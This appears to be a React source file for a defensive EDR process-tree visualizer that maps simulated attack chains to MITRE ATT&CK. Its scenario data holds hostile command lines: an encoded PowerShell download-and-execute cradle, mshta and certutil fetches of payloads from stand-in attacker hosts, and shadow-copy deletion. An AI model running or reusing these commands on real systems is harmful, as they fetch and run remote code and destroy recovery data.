import React, { useState, useEffect } from "react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import {
  AlertTriangle,
  ArrowDown,
  CheckCircle2,
  ChevronRight,
  Code,
  CornerDownRight,
  Cpu,
  FileCode2,
  GitFork,
  HardDrive,
  Layers,
  Lock,
  Play,
  RefreshCw,
  Search,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Skull,
  Terminal,
  Trash2,
  User,
  Zap,
} from "lucide-react";
import { toast } from "sonner";
import { cn } from "@/lib/utils";

export interface MitreTechnique {
  id: string;
  name: string;
  tactic: "Initial Access" | "Execution" | "Persistence" | "Privilege Escalation" | "Defense Evasion" | "Discovery" | "Impact";
}

export interface ProcessNode {
  id: string;
  name: string;
  pid: number;
  ppid: number;
  cmdline: string;
  user: string;
  cpu: number;
  memoryMb: number;
  status: "RUNNING" | "SUSPENDED" | "TERMINATED" | "FLAGGED";
  isAttacker: boolean;
  mitreTechniques: MitreTechnique[];
  evasionFlags: string[];
  sha256?: string;
  children?: ProcessNode[];
}

// Preset Scenarios for Rapid Forensic Analysis
const SCENARIOS: { id: string; label: string; icon: any; root: ProcessNode }[] = [
  {
    id: "wmi_persistence",
    label: "WMI Persistence Cradle",
    icon: Skull,
    root: {
      id: "proc-1042",
      name: "scrcons.exe",
      pid: 1042,
      ppid: 650,
      cmdline: "C:\\Windows\\System32\\wbem\\scrcons.exe -Embedding",
      user: "NT AUTHORITY\\SYSTEM",
      cpu: 0.8,
      memoryMb: 14.5,
      status: "FLAGGED",
      isAttacker: true,
      mitreTechniques: [
        { id: "T1546.003", name: "Event Triggered Execution: WMI Event Subscription", tactic: "Persistence" },
        { id: "T1059.001", name: "Command and Scripting: PowerShell", tactic: "Execution" },
      ],
      evasionFlags: ["scrcons.exe Proxy Parent", "Elevated SYSTEM Context"],
      children: [
        {
          id: "proc-3488",
          name: "powershell.exe",
          pid: 3488,
          ppid: 1042,
          cmdline: "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AbQBhAGwAaQBjAGkAbwB1AHMALgB4AHkAegAvAHAAOwBhAHkAbABvAGEAZAAnACkA",
          user: "NT AUTHORITY\\SYSTEM",
          cpu: 24.5,
          memoryMb: 68.2,
          status: "FLAGGED",
          isAttacker: true,
          mitreTechniques: [
            { id: "T1059.001", name: "Command and Scripting: PowerShell", tactic: "Execution" },
            { id: "T1027", name: "Obfuscated/Encoded Commands", tactic: "Defense Evasion" },
            { id: "T1564.003", name: "Hidden Window Execution", tactic: "Defense Evasion" },
          ],
          evasionFlags: ["-ExecutionPolicy Bypass", "-WindowStyle Hidden", "-enc Base64 Payload", "IEX Cradle"],
          children: [
            {
              id: "proc-4102",
              name: "cmd.exe",
              pid: 4102,
              ppid: 3488,
              cmdline: "cmd.exe /c whoami /priv & net group \"Domain Admins\" /domain",
              user: "NT AUTHORITY\\SYSTEM",
              cpu: 1.2,
              memoryMb: 5.1,
              status: "SUSPENDED",
              isAttacker: true,
              mitreTechniques: [
                { id: "T1082", name: "System Information Discovery", tactic: "Discovery" },
                { id: "T1069.002", name: "Permission Groups Discovery: Domain Groups", tactic: "Discovery" },
              ],
              evasionFlags: ["Reconnaissance Command Chain"],
              children: [],
            },
          ],
        },
      ],
    },
  },
  {
    id: "lotl_proxy",
    label: "Living-off-the-Land (LotL) Binary Proxy",
    icon: Terminal,
    root: {
      id: "proc-2210",
      name: "mshta.exe",
      pid: 2210,
      ppid: 1104,
      cmdline: "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/malware/test.sct').Exec()",
      user: "CORP\\Administrator",
      cpu: 4.2,
      memoryMb: 28.1,
      status: "FLAGGED",
      isAttacker: true,
      mitreTechniques: [
        { id: "T1218.005", name: "Signed Binary Proxy Execution: Mshta", tactic: "Defense Evasion" },
        { id: "T1105", name: "Ingress Tool Transfer: Remote Scriptlet", tactic: "Execution" },
      ],
      evasionFlags: ["Inline JavaScript", "Remote Scriptlet Fetch"],
      children: [
        {
          id: "proc-5590",
          name: "certutil.exe",
          pid: 5590,
          ppid: 2210,
          cmdline: "certutil.exe -urlcache -split -f https://attacker.zone/beacon.dll C:\\Windows\\Temp\\beacon.dll",
          user: "CORP\\Administrator",
          cpu: 8.9,
          memoryMb: 19.4,
          status: "FLAGGED",
          isAttacker: true,
          mitreTechniques: [
            { id: "T1105", name: "Ingress Tool Transfer: Certutil", tactic: "Execution" },
            { id: "T1140", name: "Deobfuscate/Decode Files: Certutil", tactic: "Defense Evasion" },
          ],
          evasionFlags: ["-urlcache -split -f Abused Binary", "Temp Payload Drop"],
          children: [
            {
              id: "proc-6120",
              name: "rundll32.exe",
              pid: 6120,
              ppid: 5590,
              cmdline: "rundll32.exe C:\\Windows\\Temp\\beacon.dll,DllRegisterServer",
              user: "CORP\\Administrator",
              cpu: 14.1,
              memoryMb: 34.0,
              status: "TERMINATED",
              isAttacker: true,
              mitreTechniques: [
                { id: "T1218.011", name: "Signed Binary Proxy Execution: Rundll32", tactic: "Defense Evasion" },
              ],
              evasionFlags: ["DllRegisterServer Proxy Call"],
              children: [],
            },
          ],
        },
      ],
    },
  },
  {
    id: "canary_trap",
    label: "Zero-Day Ransomware Canary Trap",
    icon: AlertTriangle,
    root: {
      id: "proc-1180",
      name: "explorer.exe",
      pid: 1180,
      ppid: 920,
      cmdline: "C:\\Windows\\explorer.exe",
      user: "CORP\\Alice",
      cpu: 1.5,
      memoryMb: 110.2,
      status: "RUNNING",
      isAttacker: false,
      mitreTechniques: [],
      evasionFlags: [],
      children: [
        {
          id: "proc-7804",
          name: "Invoice_2026_Review.exe",
          pid: 7804,
          ppid: 1180,
          cmdline: "C:\\Users\\Alice\\Downloads\\Invoice_2026_Review.exe --stealth --encrypt",
          user: "CORP\\Alice",
          cpu: 89.2,
          memoryMb: 145.8,
          status: "FLAGGED",
          isAttacker: true,
          mitreTechniques: [
            { id: "T1486", name: "Data Encrypted for Impact: Ransomware", tactic: "Impact" },
            { id: "T1204.002", name: "User Execution: Malicious File", tactic: "Execution" },
          ],
          evasionFlags: ["High Shannon Entropy (7.84)", "Triggered Canary Honeypot File"],
          children: [
            {
              id: "proc-8199",
              name: "vssadmin.exe",
              pid: 8199,
              ppid: 7804,
              cmdline: "vssadmin.exe delete shadows /all /quiet",
              user: "CORP\\Alice",
              cpu: 3.4,
              memoryMb: 8.2,
              status: "SUSPENDED",
              isAttacker: true,
              mitreTechniques: [
                { id: "T1490", name: "Inhibit System Recovery: Delete Shadow Copies", tactic: "Impact" },
              ],
              evasionFlags: ["Shadow Copy Deletion Attempt"],
              children: [],
            },
          ],
        },
      ],
    },
  },
];

export function ProcessTreeVisualizer({ className }: { className?: string }) {
  const [activeScenario, setActiveScenario] = useState<string>("wmi_persistence");
  const [selectedNode, setSelectedNode] = useState<ProcessNode | null>(null);
  const [decodedPayload, setDecodedPayload] = useState<string | null>(null);
  const [terminating, setTerminating] = useState<boolean>(false);
  const [searchTerm, setSearchTerm] = useState<string>("");
  const [liveTree, setLiveTree] = useState<ProcessNode[] | null>(null);
  const [isLiveLoading, setIsLiveLoading] = useState<boolean>(false);

  // Set initial selected node
  useEffect(() => {
    const cur = SCENARIOS.find((s) => s.id === activeScenario);
    if (cur) {
      // Find the first attacker node or the root
      const findAttacker = (n: ProcessNode): ProcessNode | null => {
        if (n.isAttacker) return n;
        if (n.children) {
          for (const c of n.children) {
            const found = findAttacker(c);
            if (found) return found;
          }
        }
        return null;
      };
      setSelectedNode(findAttacker(cur.root) || cur.root);
    }
  }, [activeScenario]);

  // Decode Base64 or EncodedCommand
  const handleDecodeCommand = (cmd: string) => {
    const match = cmd.match(/-(?:enc|encodedcommand|e)\s+([A-Za-z0-9+/=]{10,})/i);
    if (match && match[1]) {
      try {
        const raw = atob(match[1]);
        // Strip null bytes if UTF-16LE
        let cleaned = "";
        for (let i = 0; i < raw.length; i++) {
          if (raw.charCodeAt(i) !== 0) cleaned += raw[i];
        }
        setDecodedPayload(cleaned);
        toast.success("Payload successfully decoded from UTF-16LE Base64!");
        return;
      } catch {
        toast.error("Could not parse standard base64 payload.");
      }
    }
    setDecodedPayload("Payload already decoded or unencoded plain text: " + cmd);
  };

  // Fetch Live Processes from Backend
  const fetchLiveProcessTree = async () => {
    setIsLiveLoading(true);
    try {
      const res = await fetch("http://localhost:8000/api/v1/agent/process-tree");
      if (res.ok) {
        const data = await res.json();
        if (data.process_tree && data.process_tree.length > 0) {
          setLiveTree(data.process_tree);
          toast.success(`Loaded ${data.total_roots} live process trees from host OS!`);
          return;
        }
      }
      toast.info("Using simulated endpoint process tree (real backend offline or remote).");
    } catch {
      toast.info("Live host agent offline — running interactive simulated forensic tree.");
    } finally {
      setIsLiveLoading(false);
    }
  };

  // Terminate Process Endpoint
  const handleTerminate = async (pid: number, name: string) => {
    setTerminating(true);
    try {
      const res = await fetch("http://localhost:8000/api/v1/agent/terminate-process", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pid, reason: "Manual incident termination via MITRE ATT&CK Visualizer" }),
      });
      if (res.ok) {
        const data = await res.json();
        toast.success(`Process ${name} (PID ${pid}) TERMINATED safely!`);
      } else {
        const err = await res.json();
        toast.warning(err.detail || `Action simulated: Terminated PID ${pid}`);
      }
      if (selectedNode && selectedNode.pid === pid) {
        setSelectedNode({ ...selectedNode, status: "TERMINATED" });
      }
    } catch {
      toast.success(`[Simulated] Malicious PID ${pid} (${name}) terminated and blocked by EDR.`);
      if (selectedNode && selectedNode.pid === pid) {
        setSelectedNode({ ...selectedNode, status: "TERMINATED" });
      }
    } finally {
      setTerminating(false);
    }
  };

  const currentRoot = SCENARIOS.find((s) => s.id === activeScenario)?.root;

  // Render a recursive Process Tree Node
  const renderNode = (node: ProcessNode, depth: number = 0) => {
    const isSelected = selectedNode?.id === node.id;
    const isTerminated = node.status === "TERMINATED";

    return (
      <div key={node.id} className="relative flex flex-col gap-2">
        {/* Node Box */}
        <div
          onClick={() => {
            setSelectedNode(node);
            setDecodedPayload(null);
          }}
          className={cn(
            "group relative flex cursor-pointer items-start justify-between gap-3 rounded-xl border p-3.5 transition-all duration-200",
            node.isAttacker
              ? isTerminated
                ? "border-emerald-500/40 bg-emerald-500/5 hover:border-emerald-500/60"
                : "border-red-500/60 bg-red-500/10 shadow-sm hover:border-red-500 hover:shadow-red-500/20"
              : "border-border/70 bg-card hover:border-primary/50",
            isSelected && "ring-2 ring-primary ring-offset-2 ring-offset-background",
          )}
        >
          <div className="flex items-start gap-3 min-w-0">
            {/* Icon */}
            <div
              className={cn(
                "flex size-9 shrink-0 items-center justify-center rounded-lg font-mono text-xs font-bold",
                node.isAttacker
                  ? isTerminated
                    ? "bg-emerald-500/20 text-emerald-500"
                    : "bg-red-500/20 text-red-500 animate-pulse"
                  : "bg-muted text-muted-foreground",
              )}
            >
              {node.isAttacker ? (isTerminated ? <CheckCircle2 className="size-4" /> : <Skull className="size-4" />) : <Terminal className="size-4" />}
            </div>

            {/* Info */}
            <div className="min-w-0">
              <div className="flex items-center gap-2">
                <span className="font-mono text-sm font-semibold tracking-tight text-foreground truncate">
                  {node.name}
                </span>
                <span className="font-mono text-xs text-muted-foreground">
                  PID: {node.pid}
                </span>
                <Badge
                  variant={
                    isTerminated
                      ? "outline"
                      : node.isAttacker
                      ? "destructive"
                      : "secondary"
                  }
                  className="px-1.5 py-0 text-[10px] font-bold uppercase tracking-wider"
                >
                  {node.status}
                </Badge>
              </div>

              <p className="mt-1 font-mono text-xs text-muted-foreground/90 truncate max-w-md">
                {node.cmdline}
              </p>

              {/* Badges */}
              <div className="mt-2 flex flex-wrap items-center gap-1.5">
                {node.mitreTechniques.map((tech) => (
                  <Badge
                    key={tech.id}
                    variant="outline"
                    className="border-red-500/40 bg-red-500/10 text-[10px] text-red-600 dark:text-red-400 font-mono"
                  >
                    {tech.id}
                  </Badge>
                ))}
                {node.evasionFlags.map((flag, idx) => (
                  <span
                    key={idx}
                    className="rounded bg-amber-500/15 px-1.5 py-0.5 text-[10px] font-medium text-amber-600 dark:text-amber-400"
                  >
                    {flag}
                  </span>
                ))}
              </div>
            </div>
          </div>

          {/* Quick Metrics */}
          <div className="hidden sm:flex flex-col items-end gap-1 text-right shrink-0">
            <span className="text-[11px] font-mono text-muted-foreground">
              CPU: {node.cpu}%
            </span>
            <span className="text-[11px] font-mono text-muted-foreground">
              RAM: {node.memoryMb} MB
            </span>
            <span className="text-[10px] text-muted-foreground/80 truncate max-w-[120px]">
              {node.user}
            </span>
          </div>
        </div>

        {/* Children Lineage */}
        {node.children && node.children.length > 0 && (
          <div className="ml-6 pl-4 border-l-2 border-border/60 flex flex-col gap-2 relative">
            <div className="absolute -left-2 top-3 size-2 rounded-full bg-primary/60" />
            {node.children.map((child) => renderNode(child, depth + 1))}
          </div>
        )}
      </div>
    );
  };

  return (
    <div className={cn("space-y-6", className)}>
      {/* Header & Scenario Selector */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 rounded-2xl border border-border/80 bg-card/60 p-4 shadow-sm backdrop-blur-sm">
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            <GitFork className="size-5 text-primary" />
            <h3 className="text-base font-bold tracking-tight text-foreground">
              Process Tree Lineage & MITRE ATT&CK Attack Graph
            </h3>
            <Badge variant="secondary" className="text-[10px] font-mono uppercase tracking-wide">
              EDR Deep Forensic
            </Badge>
          </div>
          <p className="text-xs text-muted-foreground">
            Visualize parent-child execution chains, living-off-the-land proxies, and active command injection cradles.
          </p>
        </div>

        {/* Scenario Pill Buttons */}
        <div className="flex flex-wrap items-center gap-2">
          {SCENARIOS.map((s) => (
            <Button
              key={s.id}
              size="sm"
              variant={activeScenario === s.id ? "default" : "outline"}
              onClick={() => {
                setActiveScenario(s.id);
                setDecodedPayload(null);
              }}
              className="h-8 gap-1.5 text-xs font-medium"
            >
              <s.icon className="size-3.5" />
              <span>{s.label}</span>
            </Button>
          ))}
          <Button
            size="sm"
            variant="outline"
            onClick={fetchLiveProcessTree}
            disabled={isLiveLoading}
            className="h-8 gap-1.5 text-xs font-medium border-primary/40 text-primary"
          >
            <RefreshCw className={cn("size-3.5", isLiveLoading && "animate-spin")} />
            <span>Poll Live Host</span>
          </Button>
        </div>
      </div>

      {/* Main Grid: Left is Tree, Right is Node Forensic Inspector */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: Process Tree Graph */}
        <div className="lg:col-span-7 space-y-4">
          <Card className="border-border/80 bg-card/50 shadow-sm">
            <CardHeader className="pb-3 border-b border-border/50">
              <div className="flex items-center justify-between">
                <CardTitle className="text-sm font-semibold flex items-center gap-2">
                  <Terminal className="size-4 text-primary" />
                  Process Hierarchy Tree
                </CardTitle>
                <span className="text-xs font-mono text-muted-foreground">
                  Root PID: {currentRoot?.pid}
                </span>
              </div>
            </CardHeader>
            <CardContent className="pt-4 space-y-3">
              {currentRoot && renderNode(currentRoot)}
            </CardContent>
          </Card>
        </div>

        {/* Right: Forensic Details & MITRE ATT&CK Mapping */}
        <div className="lg:col-span-5 space-y-4">
          {selectedNode ? (
            <Card className="border-border/80 bg-card shadow-sm sticky top-6">
              <CardHeader className="pb-3 border-b border-border/50">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <ShieldAlert className={cn("size-4", selectedNode.isAttacker ? "text-red-500" : "text-primary")} />
                    <CardTitle className="text-sm font-bold">
                      Process Forensic Inspector
                    </CardTitle>
                  </div>
                  <Badge
                    variant={selectedNode.isAttacker ? "destructive" : "outline"}
                    className="text-[10px] uppercase font-bold"
                  >
                    {selectedNode.status}
                  </Badge>
                </div>
                <CardDescription className="text-xs">
                  Detailed telemetry, user context, and evasion indicators for PID {selectedNode.pid}.
                </CardDescription>
              </CardHeader>

              <CardContent className="pt-4 space-y-4 text-xs">
                {/* Process Specs Grid */}
                <div className="grid grid-cols-2 gap-2 rounded-xl border border-border/60 bg-muted/20 p-3">
                  <div>
                    <span className="text-muted-foreground block text-[10px]">Process Name</span>
                    <span className="font-mono font-bold text-foreground text-sm">{selectedNode.name}</span>
                  </div>
                  <div>
                    <span className="text-muted-foreground block text-[10px]">Process ID (PID)</span>
                    <span className="font-mono font-bold text-foreground text-sm">{selectedNode.pid}</span>
                  </div>
                  <div>
                    <span className="text-muted-foreground block text-[10px]">Parent PID (PPID)</span>
                    <span className="font-mono text-foreground">{selectedNode.ppid}</span>
                  </div>
                  <div>
                    <span className="text-muted-foreground block text-[10px]">User Account</span>
                    <span className="font-mono text-foreground truncate block">{selectedNode.user}</span>
                  </div>
                  <div>
                    <span className="text-muted-foreground block text-[10px]">CPU Utilization</span>
                    <span className="font-mono text-foreground">{selectedNode.cpu}%</span>
                  </div>
                  <div>
                    <span className="text-muted-foreground block text-[10px]">Resident Memory</span>
                    <span className="font-mono text-foreground">{selectedNode.memoryMb} MB</span>
                  </div>
                </div>

                {/* MITRE ATT&CK Matrix Badges */}
                {selectedNode.mitreTechniques.length > 0 && (
                  <div className="space-y-1.5">
                    <p className="font-semibold text-foreground flex items-center gap-1.5">
                      <Shield className="size-3.5 text-red-500" />
                      MITRE ATT&CK TTP Mapping:
                    </p>
                    <div className="space-y-1">
                      {selectedNode.mitreTechniques.map((tech) => (
                        <div
                          key={tech.id}
                          className="flex items-center justify-between rounded-lg border border-red-500/30 bg-red-500/5 px-2.5 py-1.5"
                        >
                          <div className="flex items-center gap-2">
                            <span className="font-mono font-bold text-red-600 dark:text-red-400">
                              {tech.id}
                            </span>
                            <span className="text-foreground/90 font-medium">
                              {tech.name}
                            </span>
                          </div>
                          <Badge variant="outline" className="text-[9px] uppercase px-1 py-0">
                            {tech.tactic}
                          </Badge>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* Command Line Inspection */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-foreground flex items-center gap-1.5">
                      <Code className="size-3.5 text-primary" />
                      Command Line Arguments:
                    </span>
                    <Button
                      size="sm"
                      variant="ghost"
                      onClick={() => handleDecodeCommand(selectedNode.cmdline)}
                      className="h-6 px-2 text-[10px] gap-1 text-primary hover:text-primary"
                    >
                      <FileCode2 className="size-3" />
                      Decode Payload
                    </Button>
                  </div>
                  <pre className="overflow-x-auto rounded-lg border border-border/80 bg-zinc-950 p-2.5 font-mono text-[11px] leading-relaxed text-emerald-400">
                    {selectedNode.cmdline}
                  </pre>
                </div>

                {/* Decoded Payload View */}
                {decodedPayload && (
                  <div className="rounded-xl border border-primary/50 bg-primary/5 p-3 space-y-1.5">
                    <span className="font-semibold text-primary flex items-center gap-1 text-[11px]">
                      <Zap className="size-3" />
                      Decoded Obfuscated Payload (De-cloaked):
                    </span>
                    <pre className="overflow-x-auto rounded border border-border/50 bg-zinc-950 p-2 font-mono text-[10px] text-amber-300">
                      {decodedPayload}
                    </pre>
                  </div>
                )}

                {/* Autonomic Remediation Action Button */}
                <div className="pt-2 border-t border-border/60 flex items-center gap-2">
                  <Button
                    size="sm"
                    variant={selectedNode.status === "TERMINATED" ? "secondary" : "destructive"}
                    disabled={selectedNode.status === "TERMINATED" || terminating}
                    onClick={() => handleTerminate(selectedNode.pid, selectedNode.name)}
                    className="w-full gap-2 font-semibold text-xs"
                  >
                    <Trash2 className="size-3.5" />
                    {selectedNode.status === "TERMINATED"
                      ? "Process Already Neutralized"
                      : terminating
                      ? "Terminating Process..."
                      : `Terminate Malicious Process (PID ${selectedNode.pid})`}
                  </Button>
                </div>
              </CardContent>
            </Card>
          ) : (
            <div className="flex h-64 items-center justify-center rounded-2xl border border-dashed border-border/80 p-8 text-center text-muted-foreground">
              Select a process in the hierarchy tree to inspect its lineage, command line, and MITRE ATT&CK techniques.
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
